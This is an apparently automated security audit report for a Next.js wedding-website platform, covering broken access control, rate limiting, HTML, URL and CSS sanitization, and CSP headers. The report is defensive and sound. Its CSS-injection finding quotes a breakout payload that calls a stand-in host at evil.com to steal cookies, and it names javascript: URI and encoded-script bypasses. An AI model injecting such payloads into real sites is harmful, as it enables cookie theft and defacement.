# Security Audit Report - CIAN Platform

**Date:** 2026-04-04
**Auditor:** Security Agent (automated)
**Scope:** OWASP Top 10 review of API routes, auth, middleware, and configuration

---

## Issues Found & Fixed

### CRITICAL

#### 1. Missing Authorization on Client API Routes
- **OWASP:** A01 Broken Access Control
- **Files:** `src/app/api/clients/route.ts`, `src/app/api/clients/[id]/route.ts`, `src/app/api/clients/[id]/stage/route.ts`
- **Description:** These routes had NO server-side session verification. They relied solely on middleware for auth. If middleware was bypassed (misconfigured matcher, direct serverless invocation), all client data would be exposed to unauthenticated users. CRUD operations on client data (including DELETE) were completely unprotected at the handler level.
- **Fix:** Added `getServerSession(authOptions)` checks to all handlers in these files.

#### 2. Missing Authorization on Dashboard Stats
- **OWASP:** A01 Broken Access Control
- **File:** `src/app/api/dashboard/stats/route.ts`
- **Description:** Dashboard stats endpoint had no session check, leaking business metrics (revenue, client counts, upcoming weddings) to anyone who could reach the endpoint.
- **Fix:** Added `getServerSession(authOptions)` check.

### HIGH

#### 3. No Rate Limiting on Authentication Endpoint
- **OWASP:** A07 Identification and Authentication Failures
- **File:** `src/app/api/auth/[...nextauth]/route.ts`
- **Description:** Login endpoint had no rate limiting, allowing unlimited brute-force password attempts.
- **Fix:** Applied rate limiting of 10 requests per minute per IP on the POST handler. Created sliding window rate limiter in `src/lib/rate-limit.ts`.

#### 4. No Rate Limiting on Client Creation
- **OWASP:** A04 Insecure Design
- **File:** `src/app/api/clients/route.ts`
- **Description:** POST endpoint for creating clients had no rate limiting, allowing potential abuse/spam.
- **Fix:** Applied rate limiting of 20 requests per minute per IP.

### MEDIUM

#### 5. Audit Logs Missing User Identity
- **OWASP:** A09 Security Logging and Monitoring Failures
- **Files:** `src/app/api/clients/route.ts`, `src/app/api/clients/[id]/route.ts`, `src/app/api/clients/[id]/stage/route.ts`
- **Description:** `logAudit()` calls did not include `userId`, making it impossible to trace who performed an action.
- **Fix:** Added `userId` from session to all `logAudit()` calls in client routes.

#### 6. Existing Rate Limiter Used Fixed Window
- **OWASP:** A07 Identification and Authentication Failures
- **File:** `src/lib/rate-limit.ts`
- **Description:** The previous rate limiter used a fixed window algorithm, which can allow burst attacks at window boundaries (up to 2x the limit).
- **Fix:** Rewrote to use sliding window algorithm with proper cleanup and helper function `applyRateLimit()` for easy integration.

---

## Items Reviewed - No Issues Found

### Authentication Configuration (`src/lib/auth.ts`)
- bcrypt with 12 salt rounds (meets OWASP recommendation)
- JWT session strategy properly configured
- Checks `user.isActive` before authorizing (good: disabled accounts are blocked)
- Does not leak information on failed login (returns null, not error messages)

### User Management Routes (`src/app/api/users/route.ts`, `src/app/api/users/[id]/route.ts`)
- Both have proper `getServerSession` checks
- Owner-only role enforcement on user CRUD
- Self-edit permissions properly scoped
- Owner cannot delete themselves (prevents lockout)
- Password hashing uses bcrypt with 12 rounds
- Input validated with Zod schemas

### Profile Route (`src/app/api/profile/route.ts`)
- Has `getServerSession` check
- Users can only read/edit their own profile (uses `session.user.id`)
- Input validated with Zod

### Middleware (`src/middleware.ts`)
- Protects `/admin` routes and API routes
- Uses `getToken` from next-auth/jwt
- Correctly excludes public routes (`/api/auth`, `/api/public`, `/api/webhooks`)
- Matcher config covers all protected paths

### Input Validation (`src/lib/validators/client.ts`)
- Comprehensive Zod validation on all client fields
- HTML sanitization via `sanitizeText` transform
- CPF validation with algorithm check
- Slug validation with reserved words blocklist
- Field length limits prevent abuse

### Security Headers (`next.config.ts`)
- HSTS with 2-year max-age, includeSubDomains, preload
- X-Frame-Options: SAMEORIGIN (clickjacking protection)
- X-Content-Type-Options: nosniff
- Referrer-Policy configured
- Permissions-Policy restricts camera/mic/geo

### Database (`src/lib/prisma.ts`)
- Uses Prisma ORM (parameterized queries, no SQL injection risk)
- SSL enabled for Supabase connection
- Connection pool limited to 5 (appropriate for serverless)
- Global singleton pattern prevents connection exhaustion in dev

---

## Recommendations for Future

### High Priority
1. **Content-Security-Policy header**: Add a CSP header to `next.config.ts` to prevent XSS. Start with a report-only policy and tighten iteratively.
2. **Redis-based rate limiting**: The in-memory rate limiter resets on each serverless cold start. For production, use Upstash Redis (`@upstash/ratelimit`) for distributed rate limiting across instances.
3. **Account lockout**: After N failed login attempts, temporarily lock the account (not just rate limit by IP). Attackers can use distributed IPs.

### Medium Priority
4. **CSRF protection**: NextAuth handles CSRF for its own routes, but custom API routes using cookies should verify the Origin header.
5. **SSL certificate validation**: `src/lib/prisma.ts` uses `rejectUnauthorized: false` for SSL. In production, provide the Supabase CA certificate and set `rejectUnauthorized: true`.
6. **Audit log for auth events**: Log failed login attempts with IP address for intrusion detection.
7. **API response filtering**: Some endpoints return full Prisma objects. Consider using `select` to return only necessary fields to minimize data exposure.

### Low Priority
8. **Subresource Integrity (SRI)**: Add SRI hashes to external scripts/stylesheets if any are used.
9. **Cookie security**: Verify NextAuth cookies have `Secure`, `HttpOnly`, and `SameSite=Lax` attributes in production (NextAuth defaults should handle this).
10. **Dependency audit**: Run `npm audit` regularly and keep dependencies up to date.

---

## Sprint 2 — Public Pages & RSVP Security

**Date:** 2026-04-04
**Auditor:** Security Agent (automated)
**Scope:** Public wedding websites, CSS injection prevention, sanitization hardening, CSP headers

---

### Issues Found & Fixed

#### 1. HTML Sanitization Bypass via Encoded Entities
- **OWASP:** A03 Injection
- **File:** `src/lib/sanitize.ts`
- **Description:** The original `stripHtml` used a single regex pass (`/<[^>]*>/g`) which could be bypassed using HTML-encoded entities (`&lt;script&gt;`), unclosed tags (`<script`), and null bytes. An attacker submitting RSVP messages or wedding text content could inject HTML that would survive sanitization.
- **Fix:** Rewrote `stripHtml` to: (1) decode common HTML entities before stripping, (2) iteratively strip tags to catch nested/unclosed constructs, (3) remove null bytes. Added `escapeHtml` for attribute-safe rendering.

#### 2. Missing URL Sanitization
- **OWASP:** A03 Injection
- **File:** `src/lib/sanitize.ts`
- **Description:** URL fields (heroImageUrl, galleryImages, couplePhotoUrl) in WebsiteConfig had no protocol validation. A malicious admin or compromised input could inject `javascript:` URIs or `data:text/html` URIs that execute scripts when loaded.
- **Fix:** Added `sanitizeUrl()` function that allows only `http:`, `https:`, `data:image/*`, and relative URLs. Blocks `javascript:`, `vbscript:`, `data:text/*`, and all other protocols.

#### 3. CSS Injection via Color/Font Values
- **OWASP:** A03 Injection
- **File:** New — `src/lib/validators/css-safe.ts`
- **Description:** WebsiteConfig colors and font names are rendered as CSS custom properties on public pages. While the Zod schema validates hex format for colors, font names had no allowlist. A crafted font value like `"; background: url(https://evil.com/steal?cookie=` could break out of the CSS value context and exfiltrate data or deface the page.
- **Fix:** Created `css-safe.ts` with three functions: `safeCssValue()` strips semicolons, braces, `url()`, `expression()`, and other injection vectors; `safeCssColor()` enforces hex-only colors; `safeFontFamily()` validates against an allowlist of known safe fonts.

#### 4. Missing Content-Security-Policy Header
- **OWASP:** A05 Security Misconfiguration
- **File:** `next.config.ts`
- **Description:** No CSP header was configured (flagged as recommendation in Sprint 1). Without CSP, any XSS vulnerability would have unrestricted access to execute scripts, load external resources, and exfiltrate data.
- **Fix:** Added comprehensive CSP header: restricts scripts to self + unsafe-inline (needed for Next.js), allows Google Fonts, restricts images to known sources (self, Supabase, UploadThing), blocks object/embed, restricts form targets and base URI. Added TODO to migrate from unsafe-inline to nonce-based CSP.

#### 5. Color Validation Enhancement
- **OWASP:** A03 Injection
- **File:** `src/lib/sanitize.ts`
- **Description:** No centralized color sanitization existed. While the Zod schema validates #RRGGBB format, a defense-in-depth `sanitizeColor()` function was missing for use outside Zod contexts.
- **Fix:** Added `sanitizeColor()` that validates #RGB and #RRGGBB formats and returns a fallback color for invalid input.

---

### Items Reviewed — No Issues Found

#### Website Config Zod Schema (`src/lib/validators/website.ts`)
- Color fields properly validated with hex regex
- Text fields use `sanitizeText` transform
- Field length limits are reasonable
- Schedule and gallery arrays have max size limits

#### Gift/RSVP Schemas (`src/lib/validators/gift.ts`)
- Guest name and message fields sanitized with `sanitizeText`
- Amount fields have min/max bounds
- Email validated with Zod `.email()`

#### Rate Limiting (`src/lib/rate-limit.ts`)
- Sliding window algorithm properly implemented (fixed in Sprint 1)
- Applied to auth and client creation endpoints

---

### Sprint 2 Recommendations

#### High Priority
1. **Nonce-based CSP**: Replace `'unsafe-inline'` in script-src with per-request nonces. This requires Next.js middleware to inject a nonce into both the CSP header and script tags. Currently blocked by Next.js App Router limitations — revisit when framework support improves.
2. **Apply `sanitizeUrl()` in Zod schemas**: Add `.transform(sanitizeUrl)` to all URL fields in `websiteConfigSchema` and `giftItemCreateSchema` for defense-in-depth.
3. **Apply `safeFontFamily()` in website rendering**: When rendering CSS variables on public pages, pass font values through `safeFontFamily()` before injection.

#### Medium Priority
4. **CSP report-uri**: Add a `report-uri` or `report-to` directive to collect CSP violation reports. This helps detect XSS attempts and policy issues without blocking legitimate functionality.
5. **RSVP rate limiting**: Add rate limiting to the RSVP submission endpoint to prevent spam.
6. **Image URL allowlist**: Consider restricting `heroImageUrl`, `galleryImages`, and `couplePhotoUrl` to known domains (Supabase storage, UploadThing) rather than allowing any HTTPS URL.

#### Low Priority
7. **Trusted Types**: When browser support improves, consider adding Trusted Types CSP directive for additional DOM XSS protection.
8. **Sanitization tests**: Add unit tests for edge cases in `stripHtml`, `sanitizeUrl`, and `safeCssValue` to prevent regressions.
